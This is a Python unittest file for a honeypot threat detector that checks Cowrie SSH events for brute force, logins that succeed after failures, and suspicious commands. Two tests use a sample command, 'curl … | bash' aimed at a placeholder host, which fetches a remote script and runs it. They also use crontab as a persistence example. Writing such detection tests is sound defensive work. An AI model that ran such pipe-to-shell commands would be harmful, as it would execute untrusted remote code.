import sys
import unittest

from pathlib import Path

sys.path.insert(
    0,
    str(Path(__file__).resolve().parents[1])
)

from app.detect_threats import detect_threats


class TestCloudTrapThreatDetection(unittest.TestCase):

    def make_event(self, event_type, minute, **kwargs):
        return {
            "timestamp": f"2026-11-10T00:{minute:02d}:00Z",
            "event_type": event_type,
            "source_ip": "192.168.1.50",
            "session_id": "session-test",
            "protocol": "ssh",
            **kwargs,
        }

    def test_brute_force_detection(self):
        events = [
            self.make_event("cowrie.login.failed", minute)
            for minute in range(5)
        ]

        alerts = detect_threats(events)

        brute_force = [
            a for a in alerts
            if a["rule_id"] == "authentication.brute_force"
        ]

        self.assertEqual(len(brute_force), 1)
        self.assertEqual(brute_force[0]["failed_attempts"], 5)
        self.assertEqual(brute_force[0]["severity"], "high")

    def test_below_brute_force_threshold(self):
        events = [
            self.make_event("cowrie.login.failed", minute)
            for minute in range(4)
        ]

        alerts = detect_threats(events)

        self.assertFalse(
            any(a["rule_id"] == "authentication.brute_force"
                for a in alerts)
        )

    def test_failed_login_followed_by_success(self):
        events = [
            self.make_event("cowrie.login.failed", 0),
            self.make_event("cowrie.login.failed", 2),
            self.make_event("cowrie.login.success", 4),
        ]

        alerts = detect_threats(events)

        self.assertTrue(
            any(
                a["rule_id"] ==
                "authentication.failure_then_success"
                for a in alerts
            )
        )

    def test_remote_script_execution(self):
        events = [
            self.make_event(
                "cowrie.command.input",
                10,
                command="curl https://example.invalid/install.sh | bash",
            )
        ]

        alerts = detect_threats(events)

        self.assertTrue(
            any(
                a["rule_id"] ==
                "suspicious.remote_script_execution"
                for a in alerts
            )
        )

    def test_persistence_attempt(self):
        events = [
            self.make_event(
                "cowrie.command.input",
                10,
                command="crontab -e",
            )
        ]

        alerts = detect_threats(events)

        self.assertTrue(
            any(
                a["rule_id"] ==
                "suspicious.persistence_attempt"
                for a in alerts
            )
        )

    def test_benign_commands(self):
        events = [
            self.make_event(
                "cowrie.command.input",
                10,
                command="whoami",
            ),
            self.make_event(
                "cowrie.command.input",
                11,
                command="uname -a",
            ),
            self.make_event(
                "cowrie.command.input",
                12,
                command="ls -la",
            ),
        ]

        alerts = detect_threats(events)

        self.assertEqual(alerts, [])

    def test_secrets_are_not_in_alerts(self):
        events = [
            self.make_event(
                "cowrie.command.input",
                10,
                command="curl https://example.invalid/install.sh | bash",
            )
        ]

        alerts = detect_threats(events)

        serialized = str(alerts)

        self.assertNotIn("install.sh", serialized)
        self.assertNotIn("example.invalid", serialized)

    def test_failed_attempts_outside_window(self):
        events = [
            self.make_event("cowrie.login.failed", 0),
            self.make_event("cowrie.login.failed", 10),
            self.make_event("cowrie.login.failed", 20),
            self.make_event("cowrie.login.failed", 30),
            self.make_event("cowrie.login.failed", 40),
        ]

        alerts = detect_threats(events)

        self.assertFalse(
            any(a["rule_id"] == "authentication.brute_force"
                for a in alerts)
        )


if __name__ == "__main__":
    unittest.main()
